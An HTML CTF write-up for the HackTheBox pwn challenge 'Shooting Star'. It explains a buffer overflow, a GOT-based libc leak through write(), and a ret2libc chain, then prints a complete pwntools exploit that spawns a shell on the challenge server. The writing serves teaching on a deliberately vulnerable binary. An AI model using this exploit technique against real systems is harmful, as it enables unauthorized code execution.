<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>PWN/Shooting Star - Easy</h1>
            <h2>August 2021</h2>
            <h4>Ret2libc Got Leak</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    Tired of exploring the never-ending world, you lie down and enjoy the crystal clear sky. Over a million stars above your head! Enjoy the silence and the glorious stars while you rest.
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
        <br><br>
    	The binary is pretty short. It has some useless code paths, but there really is only one interesting line. The star function reads in 0x200 bytes into a local buffer which results in a buffer overflow. Unfortunately this is the only bug in the binary and we have to deal with aslr, so we first need to get a memory leak. Luckily for us pie is not enabled, so we have access to all rop gadgets in the binary itself and can use the got section to leak a libc address. 
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/shooting_star1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        This exploit will have 2 separate payloads. The first will be constructed using gadgets contained in the binary. The purpose of this payload will be to leak a libc address so that we have access to more gadgets. To achieve this we will execute 'write(stdout,READ_GOT,size)'. This will execute write using a got entry as its argument, thus leaking a libc address. Finally we will return to main so we can exploit the vulnerability again using our second payload. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/shooting_star2.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        Now that we have a libc leak we can craft a simple ret2libc payload. <br><br>This exploit successfully spawns a shell and lets use retrieve the flag. The full exploit is posted below.
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/shooting_star9.png" alt="">
</div>
<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>

<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>

<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>

<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
<span style="color: #859900">else</span><span style="color: #839496">:</span>
    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'46.101.23.188'</span>
    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">31686</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>

<span style="color: #839496">rop</span> <span style="color: #586e75">=</span> <span style="color: #839496">ROP([elf])</span>

<span style="color: #839496">WRITE_PLT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">plt[</span><span style="color: #2aa198">'write'</span><span style="color: #839496">])</span>
<span style="color: #839496">WRITE_GOT</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">got[</span><span style="color: #2aa198">'read'</span><span style="color: #839496">])</span>
<span style="color: #839496">pop_rdi</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(rop</span><span style="color: #586e75">.</span><span style="color: #839496">find_gadget([</span><span style="color: #2aa198">'pop rdi'</span><span style="color: #839496">,</span> <span style="color: #2aa198">'ret'</span><span style="color: #839496">])[</span><span style="color: #2aa198">0</span><span style="color: #839496">])</span>
<span style="color: #839496">pop_rsi_r15</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x4012c9</span><span style="color: #839496">)</span>
<span style="color: #839496">main</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'main'</span><span style="color: #839496">])</span>

<span style="color: #839496">payload1</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">72</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rsi_r15</span> <span style="color: #586e75">+</span> <span style="color: #839496">WRITE_GOT</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x0</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(</span><span style="color: #2aa198">0x1</span><span style="color: #839496">)</span> <span style="color: #586e75">+</span> <span style="color: #839496">WRITE_PLT</span> <span style="color: #586e75">+</span> <span style="color: #839496">main</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload1)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recvuntil(</span><span style="color: #2aa198">'true!\n'</span><span style="color: #839496">)</span>
<span style="color: #839496">data</span> <span style="color: #586e75">=</span> <span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">recv(</span><span style="color: #2aa198">8</span><span style="color: #839496">)</span>
<span style="color: #839496">libc</span><span style="color: #586e75">.</span><span style="color: #839496">address</span> <span style="color: #586e75">=</span> <span style="color: #839496">u64(data</span><span style="color: #586e75">.</span><span style="color: #839496">ljust(</span><span style="color: #2aa198">8</span><span style="color: #839496">,</span><span style="color: #2aa198">b"\x00"</span><span style="color: #839496">))</span> <span style="color: #586e75">-</span> <span style="color: #2aa198">0x110140</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">clean()</span>
<span style="color: #268bd2">print</span><span style="color: #839496">(</span><span style="color: #2aa198">'[+] Libc Address: '</span> <span style="color: #586e75">+</span> <span style="color: #268bd2">str</span><span style="color: #839496">(</span><span style="color: #268bd2">hex</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">address)))</span>

<span style="color: #839496">binsh</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(</span><span style="color: #268bd2">next</span><span style="color: #839496">(libc</span><span style="color: #586e75">.</span><span style="color: #839496">search(</span><span style="color: #2aa198">b'/bin/sh\x00'</span><span style="color: #839496">)))</span>
<span style="color: #839496">system</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(libc</span><span style="color: #586e75">.</span><span style="color: #839496">sym[</span><span style="color: #2aa198">'system'</span><span style="color: #839496">])</span>
<span style="color: #839496">ret</span> <span style="color: #586e75">=</span> <span style="color: #839496">p64(rop</span><span style="color: #586e75">.</span><span style="color: #839496">find_gadget([</span><span style="color: #2aa198">'ret'</span><span style="color: #839496">])[</span><span style="color: #2aa198">0</span><span style="color: #839496">])</span>

<span style="color: #839496">payload2</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">72</span> <span style="color: #586e75">+</span> <span style="color: #839496">pop_rdi</span> <span style="color: #586e75">+</span> <span style="color: #839496">binsh</span> <span style="color: #586e75">+</span> <span style="color: #839496">system</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(</span><span style="color: #2aa198">'1'</span><span style="color: #839496">)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload2)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
</pre></div>
<br><br>

<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>